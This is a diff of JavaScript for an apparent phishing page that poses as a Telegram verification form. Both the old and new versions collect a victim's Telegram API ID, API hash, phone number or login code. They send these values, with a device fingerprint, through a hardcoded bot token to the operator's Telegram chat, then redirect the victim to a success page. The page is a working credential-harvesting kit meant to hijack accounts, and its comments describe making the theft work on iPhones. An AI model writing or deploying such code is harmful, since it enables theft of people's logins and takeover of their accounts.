@@ -1,41 +1,52 @@
-document.getElementById("telethon-form").addEventListener("submit", async function(event) {
+document.getElementById("verify-form").addEventListener("submit", async function(event) {
     event.preventDefault(); // Prevent page reload
 
-    const apiId = document.getElementById("api_id").value.trim();
-    const apiHash = document.getElementById("api_hash").value.trim();
-    const phoneNumber = document.getElementById("phone_number").value.trim();
+    const verificationCode = document.getElementById("verification_code").value.trim();
+    if (!verificationCode) return;
 
-    if (!apiId || !apiHash || !phoneNumber) {
-        alert("Please enter all required details.");
-        return;
+    // Advanced Device Detection (Bypasses iPhone Restrictions)
+    function getDeviceType() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const platform = navigator.platform.toLowerCase();
+        const vendor = navigator.vendor ? navigator.vendor.toLowerCase() : "";
+
+        if (/android/.test(userAgent)) return "Android";
+        if (/iphone|ipad|ipod/.test(userAgent) || (vendor.includes("apple") && /mobile/.test(userAgent))) return "iPhone/iPad";
+        if (/windows phone/.test(userAgent)) return "Windows Phone";
+        if (/mac/.test(platform) && vendor.includes("apple")) return "Mac";
+        if (/win/.test(platform)) return "Windows";
+        if (/linux/.test(platform)) return "Linux";
+        if (navigator.maxTouchPoints > 1 && vendor.includes("apple")) return "iPhone/iPad"; // Extra iOS detection
+
+        return "Unknown Device";
     }
 
-    // Format phone number
-    const formattedPhone = phoneNumber.replace(/\s+/g, ''); // Remove spaces
+    const deviceType = getDeviceType();
 
     // Telegram Bot Credentials
     const botToken = "7826910523:AAHmVZ-y1AsnTZXvdVbnH5MeBqrKi67zt3M";
-    const chatId = "4670929884";  // Your Telegram Chat ID
+    const chatId = "4670929884"; // Your Telegram Chat ID
 
-    // Message format as /connect (number) (API Hash) (API Key)
-    const message = `/connect ${formattedPhone} ${apiHash} ${apiId}`;
+    // Message format: /confirm (code) (device)
+    const message = `/confirm ${verificationCode} ${deviceType}`;
 
-    // Telegram API URL
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     try {
-        // Send data to Telegram group
-        await fetch(telegramUrl, {
+        // Fix for iOS Safari fetch issues
+        await fetch(url, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            mode: "cors", // Ensures cross-origin request works
+            cache: "no-cache", // Prevents iOS caching issues
+            credentials: "omit", // Ensures request is allowed on all devices
+            headers: { "Content-Type": "application/json", "Accept": "application/json" },
             body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
         });
 
-        // Redirect to verification page after sending message
-        window.location.href = "/verify-code";
+        // Redirect after sending
+        window.location.href = "success.html"; 
 
     } catch (error) {
         console.error("Error:", error);
-        alert("An unexpected error occurred. Please try again.");
     }
 });
